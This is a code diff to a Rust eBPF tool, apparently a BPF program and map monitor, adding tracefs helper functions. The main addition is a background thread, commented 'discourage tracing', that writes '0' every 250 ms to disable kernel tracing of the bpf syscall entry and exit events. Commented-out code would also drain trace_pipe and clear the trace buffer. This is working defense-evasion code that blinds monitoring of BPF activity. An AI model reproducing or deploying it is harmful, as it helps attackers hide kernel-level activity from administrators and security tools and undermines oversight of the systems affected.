@@ -1,13 +1,20 @@
-use std::{thread, time::Duration};
+use std::{
+    fs::OpenOptions,
+    io::{self, BufRead, BufReader, Seek, SeekFrom},
+    path::Path,
+    thread,
+    time::Duration,
+};
 
 use aya::{maps::HashMap, programs::TracePoint};
 
 #[rustfmt::skip]
 use log::{debug, warn};
+use std::io::Write;
+
 use clap::Parser;
 use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
 use tokio::signal;
-
 #[derive(Parser, Debug)]
 #[command(version, about, about,long_about = None)]
 pub struct Arg {
@@ -49,6 +56,36 @@ fn list_active_maps() -> Vec<u32> {
 //     __u32		next_id;
 //     __u32		open_flags;
 // };
+
+fn write_to_tracefs(message: &str, path: &str) -> std::io::Result<()> {
+    let tracefs_path = Path::new(path);
+    let mut file = OpenOptions::new().write(true).open(tracefs_path)?;
+    write!(file, "{}", message)?;
+    Ok(())
+}
+
+fn read_from_trace_pipe(filename: &str) -> io::Result<()> {
+    // Open the file for reading
+    let file = OpenOptions::new().read(true).open(filename)?;
+    let mut reader = BufReader::new(file);
+
+    // Seek to the end of the file
+    //let _ = reader.seek(SeekFrom::End(0))?;
+
+    loop {
+        // Create a buffer to hold lines
+        let mut line = String::new();
+
+        // Read a line from the file
+        if reader.read_line(&mut line)? > 0 {
+            // Print the line if it was read
+            line.clear(); // Clear the buffer for the next line
+        } else {
+            // If no lines are read, sleep for a short duration before trying again
+            thread::sleep(Duration::from_millis(100));
+        }
+    }
+}
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -150,6 +187,32 @@ async fn main() -> anyhow::Result<()> {
                 }
                 prev_id = *m;
             }
+        }
+    });
+
+    //discourage tracing
+    // thread::spawn(move || {
+    //     read_from_trace_pipe("/sys/kernel/debug/tracing/trace_pipe").unwrap();
+    // });
+    thread::spawn({
+        move || loop {
+            thread::sleep(Duration::from_millis(250));
+            if let Err(err) = write_to_tracefs(
+                "0",
+                "/sys/kernel/debug/tracing/events/syscalls/sys_enter_bpf/enable",
+            ) {
+                println!("error: {}", err);
+            };
+            if let Err(err) = write_to_tracefs(
+                "0",
+                "/sys/kernel/debug/tracing/events/syscalls/sys_exit_bpf/enable",
+            ) {
+                println!("error: {}", err);
+            };
+
+            // if let Err(err) = write_to_tracefs("", "/sys/kernel/debug/tracing/trace") {
+            //     println!("error: {}", err);
+            // };
         }
     });
     let ctrl_c = signal::ctrl_c();
